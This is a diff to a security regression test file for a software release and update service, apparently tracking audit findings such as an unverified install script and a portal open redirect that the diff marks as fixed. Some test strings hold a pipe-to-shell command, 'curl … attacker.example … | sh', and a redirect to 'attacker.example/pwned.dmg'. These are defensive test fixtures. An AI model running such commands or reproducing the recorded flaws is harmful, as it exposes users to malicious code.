@@ -22,15 +22,18 @@ import {
   DEFAULT_FINGERPRINT_POLICY,
 } from "../../src/fingerprint.js";
 import { DEFAULT_SERVICES } from "../../src/core/services.js";
-import type { FetchImpl } from "../../src/release/githubApp.js";
-import type { Arch } from "../../src/release/assets.js";
-import type { Release, ReleaseAsset } from "../../src/release/github.js";
-import { handleRelease } from "../../src/release/index.js";
-import { renderAppcast } from "../../src/release/appcast.js";
-import { defaultInstallScript } from "../../src/release/install.js";
-import { linkRepo } from "../../src/release/linkRepo.js";
+import type { FetchImpl } from "../../src/services/release/githubApp.js";
+import type { Arch } from "../../src/services/release/assets.js";
+import type {
+  Release,
+  ReleaseAsset,
+} from "../../src/services/release/github.js";
+import { handleReleaseSurface as handleRelease } from "../releaseSurface.js";
+import { renderAppcast } from "../../src/services/update/appcast.js";
+import { defaultInstallScript } from "../../src/services/release/install.js";
+import { linkRepo } from "../../src/services/release/linkRepo.js";
 import { handleGithubWebhook } from "../../src/githubWebhook.js";
-import { getReleaseConfig } from "../../src/release/index.js";
+import { getReleaseConfig } from "../../src/services/release/index.js";
 import { handlePortalDownload } from "../../src/portal/api.js";
 import {
   createPortalDownloadToken,
@@ -481,7 +484,8 @@ describe("R6-02 install.sh performs no integrity verification", () => {
   it("downloads → chmod +x → mv with no checksum, signature, or Gatekeeper check", () => {
     const script = defaultInstallScript({
       origin: "https://key.plrs.im",
-      cliBase: "/djdl/cli",
+      cliBase: "/djdl/release/dl",
+      installPath: "/djdl/release/install.sh",
       binaryName: "djdl",
       channels: ["staging", "beta"],
       versionEnv: "DJDL_VERSION",
@@ -731,7 +735,9 @@ describe("R6-03 Sparkle signature is relayed, not verified", () => {
       appcastFetch,
     );
     expect(res.status).toBe(404);
-    expect(await res.text()).not.toContain("/acme/dmg/1.2.3/acme-arm64.dmg");
+    expect(await res.text()).not.toContain(
+      "/acme/release/dl/1.2.3/acme-arm64.dmg",
+    );
   });
 });
 
@@ -815,7 +821,7 @@ describe("R6-04 artifact streaming relays a repo-chosen Content-Type with no nos
     // Still Host-derived, but now emitted as a shell-quoted literal (R6-01).
     expect(script).toContain("ORIGIN='https://attacker.example'");
     expect(script).toContain(
-      "curl -fsSL https://attacker.example/djdl/cli/install.sh | sh",
+      "curl -fsSL https://attacker.example/djdl/release/install.sh | sh",
     );
   });
 
@@ -1303,7 +1309,7 @@ describe("R6-09 appcast <description> CDATA breakout (latent)", () => {
           title: "djdl 1.2.3",
           shortVersion: "1.2.3",
           build: "1.2.3",
-          url: "https://key.plrs.im/djdl/dmg/1.2.3/djdl-arm64.dmg",
+          url: "https://key.plrs.im/djdl/release/dl/1.2.3/djdl-arm64.dmg",
           length: 1,
           pubDate: "Thu, 02 Jan 2026 03:04:05 GMT",
           descriptionHtml:
@@ -1378,8 +1384,12 @@ describe("R6-10 downgrade: deleting the newest release silently makes an older o
 // R6-11 — portal /download/<token> open redirect + single-use TOCTOU
 // ═════════════════════════════════════════════════════════════════════════════
 
-describe("R6-11 portal download redirect has no host allowlist", () => {
-  it("302s to an arbitrary off-platform source_url", async () => {
+// RE-BASELINED (P2.T2). This finding — the same defect R6-12 records — was rated **dormant**
+// on one ground: `release_artifacts.source_url` had no writer in `src/`, so the missing allowlist
+// could not be reached. `services/release/store.ts` gives it one, so the redirect is hardened in
+// the same change and the PoC below becomes its regression test.
+describe("R6-11 portal download redirect host allowlist", () => {
+  it("FIXED: refuses an arbitrary off-platform source_url instead of 302ing to it", async () => {
     const db = makeTestDb();
     const env = makeEnv(new KvMock(), [SLUG]);
     env.PORTAL_SESSION_SECRET = "test-portal-session-secret";
@@ -1423,7 +1433,8 @@ describe("R6-11 portal download redirect has no host allowlist", () => {
       "application/octet-stream",
       123,
       "sha",
-      // No allowlist is applied to this value anywhere on the redemption path.
+      // The value the finding turned into an open redirect. It is now refused: only an https
+      // GitHub storage host may become a `Location` (`portal/api.ts` `redirectableSourceUrl`).
       "https://attacker.example/pwned.dmg",
       null,
       null,
@@ -1449,10 +1460,8 @@ describe("R6-11 portal download redirect has no host allowlist", () => {
       token,
       NOW + 1,
     );
-    expect(res.status).toBe(302);
-    expect(res.headers.get("location")).toBe(
-      "https://attacker.example/pwned.dmg",
-    );
+    expect(res.status).toBe(404);
+    expect(res.headers.get("location")).toBeNull();
   });
 
   // FIXED (R9-05b / R11-05): the single-use marking is a conditional UPDATE now.
@@ -1499,7 +1508,9 @@ describe("R6-11 portal download redirect has no host allowlist", () => {
       "application/octet-stream",
       123,
       "sha",
-      "https://cdn.example/djdl.dmg",
+      // An ALLOWLISTED host, so this test still exercises the single-use race rather than
+      // stopping at the host check the test above covers.
+      "https://objects.githubusercontent.com/djdl.dmg",
       null,
       null,
       "public",
